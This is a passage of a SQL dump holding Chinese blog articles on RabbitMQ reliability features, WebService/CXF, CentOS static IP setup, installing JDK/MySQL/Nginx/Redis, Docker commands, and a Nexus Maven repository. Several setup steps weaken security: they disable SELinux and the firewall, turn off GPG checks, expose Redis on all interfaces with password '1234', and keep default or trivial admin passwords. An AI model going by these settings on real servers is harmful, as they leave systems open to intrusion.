生产者进行接收应答,用来确认这条消息是否正常的发送的Broker,这种方式也是消息的*可靠性投递的核心保障*\n``` \n\n#### 默认队列\n```java\n		// 此处省略connection创建...\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		// 指定确认模式\n		channel.confirmSelect();\n		String exchangeName = \"test_return_exchange\";\n		String routingKey = \"return.save\";\n		String routingKeyError = \"err.save\";\n		\n		String msg = \"confirmMsg\";\n		// 不可达\n		channel.addReturnListener(new ReturnListener() {\n			@Override\n			public void handleReturn(int replyCode, String replyText, String exchange, String routingKey,\n		        AMQP.BasicProperties properties, byte[] body)\n					throws IOException {\n				System.err.println(\"--------handler return-----------\");\n				System.out.println(\"replyCode: \" + replyCode);\n				System.out.println(\"replyText: \" + replyText);\n				System.out.println(\"exchange: \" + exchange);\n				System.out.println(\"routingKey: \" + routingKey);\n				System.out.println(\"properties: \" + properties);\n				System.out.println(\"body: \" + new String(body));\n			}\n		});\n		// channel.basicPublish(exchangeName, routingKey, true, null, msg.getBytes());\n		channel.basicPublish(exchangeName, routingKeyError, true, null, msg.getBytes());\n\n1. ReturnListener用于处理一些不可路由的消息\n2. 我们的消息生产者,通过指定Exchange和RoutingKey,把消息送达到某一个队列中去,然后我们的消费者队列监听队列,进行消费处理操作\n3. 但是在某些情况下,如果我们在发送消息的时候,当前的exchange不存在或者指定的路由key路由不到,这个时候如果我们需要监听这种b不可达的消息,就要使用ReturnListener\n4. 在基础API中有一个关键的配置项,Mandatory: 如果为true,则监听器会接收到路由不可达的消息,然后进行后续处理,如果为false,那么broker端自动删除该消息\n```\n\n#### 消息限流与手工签收\n```java\n	// arg1: prefetchSize: 大小,\n	// arg2: prefetchCount: 会告诉RabbitMQ不要同时给一个消费者推送多于N个消息,即一旦有N个消息还没有ack,则该consumer将block掉,直到有消息ack\n	// arg3: global: true\\false是否将上面设置只应用于channel,简单点说,就是上面限制是channel级别的还是consumer级别\n	channel.basicQos(0, 1, false);\n	\n	// arg1: 队列名称	\n	// arg2: 是否自动签收,必须要关闭\n	// arg3: 自定义的消费处理器\n	channel.basicConsume(queueName, false, new MyConsumer(channel));\n\n// 为什么要关闭自动签收\n1. 假设一个场景,首先,我们RabbitMQ服务器有上万条未处理的消息,我们随便打开一个消费者客户端,会出现下面情况\n2. 巨量的消息瞬间全部推送过来,但是我们单个客户端无法同时处理这么多数据,服务器可能会宕机\n3. RabbitMQ提供了一种qos(服务质量保证)功能,即在非自动确认消息的前提下,如果一定数目的消息(通过基于consumer或channel设置Qos)*未被确认前,不进行消费新的消息*\n4. 消费端进行消费的时候,如果由于业务异常我们可以进行日志的记录,然后进行补偿\n5. 如果由于服务器宕机等严重问题,那我们就需要手工补偿进行ACK保障消费端消费成功 \n\n// 消费端的重回队列\n1. 消费端重回队列是为了对没有处理成功的消费,把消息重新传递给Broker,*会重回队列的尾部*\n2. 一般我们在实际应用中,都会关闭重回队列(因为没有意义),也就是设置为false\n\n```\n\n#### 死信队列(DLX)与消息生命周期(TTL)\n```java\n// 死信队列接收什么消息\n1. 消息被拒绝(basic.reject/basic.nack)并且requeue(重回队列)=false\n2. 消息生命周期过期\n3. 目标队列达到最大长度,已阻塞\n4. 当某队列中有死信时,RabbitMQ就会自动的将这个消息重新发布到设置的Exchange上去,进而被路由到死信队列\n5. 死信队列也是一个正常的Exchange,和一般的Exchange没有区别,它能在任何的队列上被指定,实际上就是设置某个队列的属性\n\n// 给正常队列配置死信队列\n	// 此处省略connection创建...\n	// 通过connection创建Channel\n	Channel channel = connection.createChannel();\n		\n	String exchangeName = \"test_dlx_exchange\";\n	String type = \"topic\";\n	String routingKey = \"dlx.#\";\n	String queueName = \"test_dlx_queue\";\n		\n	String dlxExchangeName = \"dlx.exchange\";\n	String dlxQueueName = \"dlx.queue\";\n	String dlxRoutingKey = \"#\";\n		\n	channel.exchangeDeclare(exchangeName, type, true, false, null);\n	Map<String, Object> arguments = new HashMap<String, Object>();\n	// 要进行死信队列的声明\n	arguments.put(\"x-dead-letter-exchange\", dlxExchangeName);\n		\n		\n	// !!注意,这个arguments属性,要设置到声明正常队列上\n	channel.queueDeclare(queueName, true, false, false, arguments);\n	channel.queueBind(queueName, exchangeName, routingKey);\n		\n	// !!注意,要进行死信队列的声明\n	channel.exchangeDeclare(dlxExchangeName, type, true, false, null);\n	channel.queueDeclare(dlxQueueName, true, false, false, null);\n	channel.queueBind(dlxQueueName, dlxExchangeName, dlxRoutingKey);\n\n	channel.basicQos(0, 1, false);\n	channel.basicConsume(queueName, false, new MyConsumer(channel)); \n```\n\n### 各种类型消息\n```java\n// 消息类型\n1. 迅速消息\n2. 可用消息\n3. 批量消息\n4. 延迟消息\n5. 顺序消息\n6. 事务消息\n\n// 迅速消息\n1. 迅速消息是指消息不进行落库存储,不做可靠性的保障\n2. 在一些非核心消息,日志数据,或者统计分析等场景下比较合适\n3. 迅速消息的优点就性能最高,吞吐量最大\n\n// 可用消息\n1. 依靠回调可靠性投递补偿方案\n\n// 批量消息\n1. 批量消息是指我们把消息放到一个集合里统一进行提交,这种方案设计思路是期望消息在一个会话里,比如投掷到threadlocal里集合<SessionId,List>\n2. 因为拥有相同会话ID,并且带有这次提交消息的SIZE等相关属性,最重复的一点是要把这一批消息进行合并.对于Channel而言,就是发送一次消息.\n3. 这种方式也是希望消费端在消费的时候,可以进行批量化的消费,针对于某一个原子业务的操作去处理,但是不保障可靠性,需要进行补偿机制\n\n// 延迟消息\n1. 延迟消息需要添加RabiitMQ插件,接着就是在我们在Message封装的时候添加过期时间属性即可,使得我们的消息可以进行延迟发送\n2. 根据具体的业务场景也可以很好的使用到.比如你在电商平台买到商品签收后,不点击确认支付,那么系统自动会在7天(一定时间)去进行自动支付操作,还有一些自动超时作废的场景,你的优惠劵/红包有使用时间限制,也可以用延迟消息机制\n\n// 顺序消息\n1. 顺序消息,比较类似于批量消息的实现机制,但是也有些不同\n2. 发送的顺序消息,必须保障消息投递到同一个队列,且这个消费者只能有一个(独占模式)\n3. 添加消息属性:顺序标记的序号,和本次顺序消息的SIZE属性\n\n// 事务消息\n1. 事务消息大都属于分布式事务处理方面\n2. 无法保证强一致性,而是最终一致性,期间出现base理论中的软状态\n3. 依靠队列的持久化存储与幂等性处理来解决\n\n```', 0, 0, 187, 0, 0, '2019-09-11 14:14:01', '2019-09-11 14:14:01', 0, 0);
INSERT INTO `article` VALUES (36, 1, 'webService与cxf使用', '2018/11/1541670658_11df62d2d27b2ff0a88a2935557ff3f3.jpg', '### WebService\n```java\n// 概述\nwebservice是一种系统之间的远程调用技术\nwebservice之间的调用可以实现跨语言跨平台调用\n使用Http方式POST请求,接收和响应外部系统的某种请求,从而实现远程调用\n用于开发分布式的互操作的应用程序,基于http协议,底层xml协议\nSOAP服务,约束xml结构,文本协议\n\n```\n#### 订阅webServer\n![TIM截图20181108181723.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541672377_TIM截图20181108181723.png)\n![TIM截图20181108182308.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541672608_TIM截图20181108182308.png)\n```java\n// webserver是jdk6自带的,相比于SpringCloud和Dubbo,它的学习成本明显更低,且容易理解\n\n// 步骤\n1. 进入一个Demo网站 -> http://www.webxml.com.cn\n2. 寻找一个wsdl服务,比如手机号码归属地查询\n3. 打开cmd窗口,输入命令(需要配置jdk6+环境,因为wsimport是jdk的命令)\n   比如 wsimport -s . http://ws.webxml.com.cn/WebServices/MobileCodeWS.asmx?wsdl\n4. 将生成文件放入文件夹中(class文件可以删除)\n5. 创建一个App.java,写以下内容\n\npublic static void main(String[] args) {\n     MobileCodeWS ss = new MobileCodeWS();\n     MobileCodeWSSoap soap = ss.getMobileCodeWSSoap();\n     String ret = soap.getMobileCodeInfo(\"1851166\", null);\n     System.out.println(ret); // 会输出电话信息\n} \n```\n\n#### 发布webService\n```java\n// 我们需要自己创建webservice服务端与客户端\n\n// 创建一个服务端\n@WebService\npublic class HelloService {\n	public String sayHello(String name) {\n		System.out.println(\"接收:\" + name);\n		return \"hello\" + name;\n	}\n	\n	public static void main(String[] args) {\n		String address = \"127.0.0.1:8080/hello\";\n		Object implementor = new HelloService();\n		Endpoint.publish(address, implementor);\n	}\n} \n\n// 运行后服务启动,浏览器输入http://127.0.0.1:8080/hello?wsdl, 看到一堆xml结构,说明发布成功了\n```\n#### 调用WebServer\n```java\n// 调用webService\n// 调用前需要知道这些xml标签代表什么意思,也就是需要了解*SOAP协议*结构和*WSDL*\n\n// WSDL\n1. 就是一个xml文档,用于*描述当前服务的一些信息*(服务名称,服务的发布地址,服务提供的方法,方法的参数,方法的返回值) \nservice[name]: 服务名称\nport->address[localtion]: 服务的发布地址\noperation[name]: 服务提供的方法\nelement->complexType->sequence->element: 方法的参数和返回值(多一个response后缀)\n\n1. wsimport -s . http://127.0.0.1:8080/hello?wsdl 下载代码 \n2. 根据wsdl的信息可以写入如下代码\n\n/**\n * 1. 使用wsimport命令解析wsdl文件生成本地代码\n * 2. 通过本地代码来创建一个代理对象\n * 3. 通过代理对象实现远程调用\n * @author tuwq\n *\n */\npublic class App {\n	public static void main(String[] args) {\n		HelloServiceService hss = new HelloServiceService();\n		HelloService proxy = hss.getHelloServicePort();\n		String sayHello = proxy.sayHello(\"webservice\");\n		System.out.println(sayHello); // hello webservice\n	}\n}\n\n// 4. 服务端会打印接收requestm,客户端会接收返回值打印hellowebservice\n```\n\n### cxf框架\n#### cxf发布服务\n```java\n// cxf是apache的一个webservice框架\n// web.xml添加内容\n <!-- 配置CXF框架提供的Servlet -->\n  <servlet>\n  	<servlet-name>cxf</servlet-name>\n  	<servlet-class>org.apache.cxf.transport.servlet.CXFServlet</servlet-class>\n  	<!-- 通过初始化参数指定CXF框架的配置文件位置 -->\n  	<init-param>\n  		<param-name>config-location</param-name>\n  		<param-value>classpath:cxf.xml</param-value>\n  	</init-param>\n  </servlet>\n  <servlet-mapping>\n  	<servlet-name>cxf</servlet-name>\n  	<url-pattern>/service/*</url-pattern>\n  </servlet-mapping> \n\n// 编写服务(接口与实现类)\n// 接口上添加注解,而不是实现类\n@WebService\npublic interface HelloService {\n	String sayHello(String name);\n}\npublic class HelloServiceImpl implements HelloService {\n	@Override\n	public String sayHello(String name) {\n		System.out.println(\"接收到:\" + name);\n		return \"hello\" + name;\n	}\n} \n\n// cxf.xml注册服务\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \nxmlns:jaxws=\"http://cxf.apache.org/jaxws\"\nxmlns:soap=\"http://cxf.apache.org/bindings/soap\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans \n					http://www.springframework.org/schema/beans/spring-beans.xsd\n					http://cxf.apache.org/bindings/soap \n					http://cxf.apache.org/schemas/configuration/soap.xsd\n					http://cxf.apache.org/jaxws \n					http://cxf.apache.org/schemas/jaxws.xsd\">\n	<!-- 引入CXF Bean定义如下,早期的版本中使用 -->\n	<import resource=\"classpath:META-INF/cxf/cxf.xml\" />\n	<import resource=\"classpath:META-INF/cxf/cxf-extension-soap.xml\" />\n	<import resource=\"classpath:META-INF/cxf/cxf-servlet.xml\" />\n	\n	<bean id=\"helloService\" class=\"tuwq.service.HelloServiceImpl\"/>\n	\n	<!-- 注册服务 -->\n	<jaxws:server id=\"myService\" address=\"/cxfService\">\n		<jaxws:serviceBean>\n			<ref bean=\"helloService\"/>\n		</jaxws:serviceBean>\n	</jaxws:server>\n</beans> \n\n// 访问 http://127.0.0.1:[tomcat端口名]/[tomcat项目名]/service/cxfService?wsdl 查看是否发布成功\n```\n#### cxf调用服务\n```java\n// 导入cxf相关jar包\n// http://127.0.0.1:[tomcat端口名]/[tomcat项目名]/service/cxfService?wsd 下载代码(*只需要接口和实体类的Java文件*)\n\n// cxf.xml注册服务来源\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \nxmlns:jaxws=\"http://cxf.apache.org/jaxws\"\nxmlns:soap=\"http://cxf.apache.org/bindings/soap\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans \n					http://www.springframework.org/schema/beans/spring-beans.xsd\n					http://cxf.apache.org/bindings/soap \n					http://cxf.apache.org/schemas/configuration/soap.xsd\n					http://cxf.apache.org/jaxws \n					http://cxf.apache.org/schemas/jaxws.xsd\">\n	<!-- 引入CXF Bean定义如下,早期的版本中使用 -->\n	<import resource=\"classpath:META-INF/cxf/cxf.xml\" />\n	<import resource=\"classpath:META-INF/cxf/cxf-extension-soap.xml\" />\n	<import resource=\"classpath:META-INF/cxf/cxf-servlet.xml\" />\n	\n	<!-- 注册CXF客户端代理对象，通过spring框架创建这个代理对象，使用代理对象实现远程调用 -->\n	<jaxws:client id=\"myClient\" \n				address=\"http://127.0.0.1:9001/cxf-server/service/cxfService\" \n				serviceClass=\"tuwq.service.HelloService\">\n	</jaxws:client>\n</beans>\n\n// 调用服务\npublic class App {\n	public static void main(String[] args) {\n		ApplicationContext ctx = new ClassPathXmlApplicationContext(\"cxf.xml\");\n		HelloService service = (HelloService) ctx.getBean(\"myClient\");\n		String sayHello = service.sayHello(\"name\");\n		System.out.println(sayHello);\n	}\n}\n```', 0, 0, 105, 0, 0, '2019-09-15 17:51:30', '2019-09-15 17:51:30', 0, 0);
INSERT INTO `article` VALUES (37, 1, '笔记本centos7虚拟机安装拷贝与固定ip配置', '2019/4/1556110756_e8970d0e4965a7ff542da82ef3864cc6.jpg', '### 安装搭建虚拟机\n![TIM截图20190424210404.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210404.png)\n![TIM截图20190424210440.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210440.png)\n![TIM截图20190424210448.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210448.png)\n![TIM截图20190424210718.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210718.png)\n![TIM截图20190424210740.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210740.png)\n![TIM截图20190424210824.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210824.png)\n![TIM截图20190424210929.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424210929.png)\n![TIM截图20190424211319.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424211319.png)\n![TIM截图20190424212408.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556112328_TIM截图20190424212408.png)\n\n### 配置固定ip\n#### 网络配置\n![TIM截图20190424213107.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556113333_TIM截图20190424213107.png)\n![TIM截图20190424213728.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556113333_TIM截图20190424213728.png)\n![TIM截图20190424214036.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556113333_TIM截图20190424214036.png)\n\n#### 虚拟机配置\n![TIM截图20190424215958.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556114689_TIM截图20190424215958.png)\n```c++\n// 1. 进入/etc/sysconfig/network-scripts目录\ncd /etc/sysconfig/network-scripts/\n\n// 2. 修改文件 ifcfg-e.. 每个虚拟机后缀可能会不一样\nvi ifcfg-eno16777736\n// 修改内容\nTYPE=Ethernet\n// 开机协议,设置为static \nBOOTPROTO=static\nPEERDNS=yes\nPEERROUTES=yes\nDEFROUTE=yes\nIPV4_FAILURE_FATAL=no\n#IPV6INIT=yes\n#IPV6_AUTOCONF=yes\n#IPV6_DEFROUTE=yes\n#IPV6_FAILURE_FATAL=no\n#IPV6_PEERDNS=yes\n#IPV6_PEERROUTES=yes\nNAME=ens33\nUUID=f0a20a07-94a6-47cb-8a24-47980d30f603\nDEVICE=ens33\n// 设置为开机启动\nONBOOT=yes\n// 主DNS1地址,114为常用DNS\nDNS1=114.114.114.114\n// 设置为想要的固定ip地址\nIPADDR=192.168.147.102\nNETMASK=255.255.255.0\n// 设置为虚拟网络编辑器中的网关ip\nGATEWAY=192.168.147.2\n\n// 3. 修改后重启网络服务\nservice network restart\n```\n#### 测试网络是否正常\n![TIM截图20190424220422.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556114689_TIM截图20190424220422.png)\n如果一切正常,那么就可以使用远程连接工具来连接固定ip的虚拟机了\n\n### 克隆虚拟机\n#### 创建克隆虚拟机\n![TIM截图20190424223812.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117001_TIM截图20190424223812.png)\n![TIM截图20190424223842.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223842.png)\n![TIM截图20190424223949.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223949.png)\n#### 克隆虚拟机需要修改网络配置\n![TIM截图20190424222137.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424222137.png)\n![TIM截图20190424223040.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223040.png)\n![TIM截图20190424223329.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223329.png)\n![TIM截图20190424223641.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556117002_TIM截图20190424223641.png)', 0, 0, 60, 0, 0, '2019-10-02 20:59:27', '2019-10-02 20:59:27', 0, 0);
INSERT INTO `article` VALUES (38, 1, 'centos安装jdk,mysql,nginx,redis', '2018/9/1535899296_92315b1e1ff4f42c9ae6dc9fb71efbdb.jpg', '### 安装jdk\n```java\n// 1. 修改/etc/profile\nvi /etc/profile\n\n// 添加以下内容\nexport JAVA_HOME=/usr/jdk/jdk1.8.0_191\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$JAVA_HOME/bin:$PATH\n\n// 2. 重新读取文件\nsource /etc/profile\n\n// 3. 查看是否配置成功\njava -version\n```\n\n\n\n### 安装mysql\n```java\n// (1) 先移除mariadb数据库: \nyum remove mariadb-libs.x86_64\n// (2) 创建mysql目录: \nmkdir /etc/mysql\n// (3) 进入/etc/mysql下载mysql: \nwget https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm\n// (4) 添加到本地: \nyum localinstall mysql80-community-release-el7-3.noarch.rpm\n// (5) 正式安装: \nyum install mysql-community-server\n// (6) 启动测试: \nservice mysqld start\nservice mysqld status\nservice mysqld stop\n// 查看默认密码: \ncat /var/log/mysqld.log | grep password\n// 登录: \nmysql -u root -p\n// 修改密码: \nset global validate_password.policy=0;\nset global validate_password.length=1;\nALTER USER \"root\"@\"localhost\" IDENTIFIED BY \"mysqlpassword\";\n// (7) 退出并重新输入密码登录:\nmysql -uroot -p\n```\n\n### 安装Nginx\n```java\n// 1. 修改yum源\nvi /etc/yum.repos.d/nginx.repo\n\n[nginx]\nname=nginx repobaseurl=http://nginx.org/packages/centos/7/$basearch/\ngpgcheck=0\nenabled=1\n	\n// 2. 安装nginx,安装成功安装在/etc/nginx\nyum install nginx\n	\n// 3. 启动命令\nnginx\nps -ef | grep nginx\nnginx -s reload\nnginx -s stop\nnginx -V\n/etc/nginx/nginx.conf\n// 4. 注意配置反向代理要关闭selinux\nsetenforce 0\n```\n\n### 安装redis\n```c++\n// 1. 下载redis\nwget http://download.redis.io/releases/redis-3.2.9.tar.gz\n\n// 2. 解压redis\ntar -zxvf redis-3.2.9.tar.gz\n\n// 3. 进入解压后源码src目录并make\ncd redis-3.2.9/src/\nmake install PREFIX=/usr/local/redis\n\n// 4. make成功后,将源码目录的redis.conf复制到生成redis的etc配置文件目录\nmkdir /usr/local/redis/etc\ncp ~/redis-3.2.9/redis.conf /usr/local/redis/etc/\n\n// 5. 修改redis.conf\ncd /usr/local/redis/etc/\nvi redis.conf\n// 修改内容\n// 后台启动redis\ndaemonize yes\n// 配置连接密码\nrequirepass 1234\n// 允许外部访问\nbind 0.0.0.0\n\n// 6. 启动redis\ncd bin\n./redis-server /usr/local/redis/etc/redis.conf\n\n// 7. 测试连接redis是否正常运行,\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\"\n\n// 8. 关闭防火墙\nsystemctl stop firewalld\n```', 0, 0, 141, 0, 0, '2019-10-02 22:45:10', '2019-10-02 22:45:10', 0, 0);
INSERT INTO `article` VALUES (39, 1, 'docker安装配置与常用命令', '2019/4/1556199418_43f6913d115a57737941e71430bbdc2c.jpg', '### 安装docker\n#### 检查版本\n![TIM截图20190425214633.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556201665_TIM截图20190425214633.png)\n#### 开始安装\n```kotlin\n/* 依次输入以下命令 */\n// 1. 通过 uname -r 命令查看你当前的内核版本\nuname -r\n\n// 2. 使用 root 权限登录 Centos。确保 yum 包更新到最新\nyum -y update\n\n// 3. 卸载旧版本(如果安装过旧版本的话)\nyum remove docker docker-common docker-selinux docker-engine\n\n// 4. 安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的\nyum install -y yum-utils device-mapper-persistent-data lvm2\n\n// 5. 设置yum源\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n\n// 6. 可以查看所有仓库中所有docker版本，并选择特定版本安装\nyum list docker-ce --showduplicates | sort -r\n\n// 7. 安装docker\nsudo yum install -y docker-ce\n\n// 8. 启动并加入开机启动\nsystemctl start docker\nsystemctl enable docker\n\n// 9. 验证安装是否成功(有client和service两部分表示docker安装启动都成功了) \ndocker version\n```\n![TIM截图20190425221310.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556202081_TIM截图20190425221310.png)\n\n### 采用阿里云镜像\n#### 前往阿里云获取信息\nhttps://cr.console.aliyun.com/cn-hangzhou/mirrors \n\n#### 复制粘贴命令\n![TIM截图20190425222730.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556283104_TIM截图20190425222730.png)\n![TIM截图20190425222614.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556283104_TIM截图20190425222614.png)\n\n### 镜像相关命令\n![TIM截图20190425225519.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556283311_TIM截图20190425225519.png)\n```kotlin\n// 1、搜索镜像\n// 执行该命令后,Docker就会在DockerHub中搜索含有java这个关键词的镜像仓库\n// 类似maven的中央仓库)中的镜像。\ndocker search java\n\n// 2. 下载镜像Docker会从仓库下载最新版本的 Java镜像。如果要下载指定版本则在java后面加冒号指定版本\ndocker pull java:8\n\n// 3. 列出已下载的镜像\ndocker images\n\n// 4. 删除镜像,若由该镜像创建过容器,则必须先删除镜像创建的容器\ndocker rmi d23bdf5b1b1b // IMAGE_ID\ndocker -f rmi (IMAGE_ID) // -f 强制删除,包括删除镜像创建的容器\n```\n\n### 容器相关命令\n![TIM截图20190426212618.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556286203_TIM截图20190426212618.png)\n![TIM截图20190426213038.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556286203_TIM截图20190426213038.png)\n![TIM截图20190426214118.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556286203_TIM截图20190426214118.png)\n```kotlin\n// 1. 开启80端口,关闭防火墙并重启docker服务\nfirewall-cmd --zone=public --add-port=80/tcp --permanent\nsystemctl stop firewalld\nsystemctl restart docker\n\n// 2. 启动容器， \ndocker run -d -p 80:80 nginx // -d 后台运行 -p 宿主机端口:容器端口\n\n// 3.查看执行中的容器列表\ndocker ps\ndocker ps -a // -a 显示所有,无论是否执行\n\n// 4. 查看容器程序是否正常启动\npx aux | grep nginx\n\n// 5. 查看容器详细信息\ndocker inspect e3347b654e92 // CONTAINER ID\n\n// 6. 停止运行容器\ndocker stop cranky_bell // docker ps -a 中容器的NAMES\n\n// 7. 删除容器\ndocker rm e3347b654e92 // CONTAINER ID\n```\n\n### 修改容器的配置文件\n![TIM截图20190427213237.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373313_TIM截图20190427213237.png)\n![TIM截图20190427213637.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373314_TIM截图20190427213637.png)\n![TIM截图20190427214512.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373314_TIM截图20190427214512.png)\n![TIM截图20190427214156.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556373314_TIM截图20190427214156.png)\n```kotlin\n// 1. 进入容器内部,根据容器的CONTAINER ID\ndocker container exec -it a77028f174b5 /bin/bash\n\n// 2. 启动容器\ndocker start a77028f174b5 \n\n// 3. 停止容器\ndocker stop a77028f174b5 \n\n// 4. 重启容器\ndocker restart a77028f174b5\n\n```\n\n### 解决容器配置出错导致容器启动失败与挂载外部配置文件\n![TIM截图20190427220508.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427220508.png)\n![TIM截图20190427222509.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427222509.png)\n![TIM截图20190427222655.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427222655.png)\n![TIM截图20190427223353.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556375747_TIM截图20190427223353.png)\n```kotlin\n// 1. 当容器中的配置文件拷贝至当前目录,根据容器id\ndocker cp fe59072e2cc5:/etc/nginx/conf.d/default.conf .\n\n// 2. 将文件拷贝覆盖至容器中的配置文件,根据容器id\ndocker cp /dockertemp/default.conf fe59072e2cc5:/etc/nginx/conf.d/default.conf\n```\n\n### 自定义镜像\n![TIM截图20190427232509.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556379157_TIM截图20190427232509.png)\n![TIM截图20190427232815.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556379157_TIM截图20190427232815.png)\n![TIM截图20190427233038.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556379157_TIM截图20190427233038.png)\n```kotlin\n// 1. 创建Dockerfile文件,添加以下内容\n// 指定java8环境镜像\nFROM java:8\n// 复制文件到容器目录/app.jar\nADD springboot-example.jar /app.jar\n// 声明启动端口号\nEXPOSE 8080\n// 配置容器启动后执行的命令\nENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"]\n\n// 2. 使用docker build命令构建镜像\n// docker build -t 镜像名称:标签 Dockerfile的相对位置\ndocker build -t spring-example-images .\n\n// 3. 启动一个镜像的容器,并指定外部端口与docker内部端口\ndocker run -p 8080:8080 spring-example-images\n```', 0, 0, 55, 0, 0, '2019-10-05 21:37:15', '2019-10-05 21:37:15', 0, 0);
INSERT INTO `article` VALUES (40, 1, 'docker搭建maven私服并上传与下载jar包', '2019/4/1556543150_23eac8068dffeb8e276fa9263119b30f.jpg', '### 安装与基本配置 \n#### 安装maven私服\n![TIM截图20190428220545.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190428220545.png)\n```kotlin\n// 1.下载一个nexus3的镜像\ndocker pull sonatype/nexus3\n\n// 2.将容器内部/var/nexus-data挂载到主机/root/nexus-data目录\ndocker run -d -p 8081:8081 --name nexus -v /root/nexus-data:/var/nexus-data --restart=always sonatype/nexus3\n\n// 3.关闭防火墙\nsystemctl stop firewalld\n\n// 4.查看nexus3是否正常运行在docker运行列表中,nexus3启动可能需要一分钟左右\ndocker ps\n```\n\n#### 进入nexus页面\n![TIM截图20190429210836.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190429210836.png)\n```kotlin\n// 1.访问服务器ip:8081\n192.168.147.100:8081\n\n// 2.登录\n默认用户 admin \n默认密码 admin123\n```\n\n\n#### 创建仓库\n![TIM截图20190428221401.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190428221401.png)\n![TIM截图20190428221448.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543582_TIM截图20190428221448.png)\n![TIM截图20190428221826.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556543982_TIM截图20190428221826.png)\n```kotlin\n1. 输入仓库名称\n\n2. DeploymentPoliecy处选择Allow redeploy,否则会上传失败\n\n3. 确定创建仓库\n```\n\n#### 创建用户\n![TIM截图20190428221918.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544307_TIM截图20190428221918.png)\n![TIM截图20190428221826.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544307_TIM截图20190428221826.png)\n```kotlin\n1. 填写用户信息,我的用户名是tuwq,密码123456\n\n2. Status状态处设置为Active可用状态\n\n3. Roles处选择管理员角色\n\n4. 确认创建用户\n \n```\n\n### 上传jar包至私服\n#### 查看刚刚创建的仓库url地址\n![TIM截图20190429212846.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544783_TIM截图20190429212846.png)\n\n#### 查看需要上传的jar包项目所使用的maven的settings文件路径\n![TIM截图20190428223640.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544783_TIM截图20190428223640.png)\n\n#### setting文件中添加刚创建的用户的信息\n![TIM截图20190428223845.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556544783_TIM截图20190428223845.png)\n```kotlin\n// 1. servers标签下添加刚创建的用户的信息\n<server>\n	<id>tuwq</id>\n	<username>tuwq</username>\n	<password>123456</password>\n</server>\n```\n\n#### 上传的项目pom文件中添加配置\n![TIM截图20190428225234.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556545766_TIM截图20190428225234.png)\n```kotlin\n<!-- 私服maven相关配置 -->\n<distributionManagement>\n	<repository>\n		<!-- 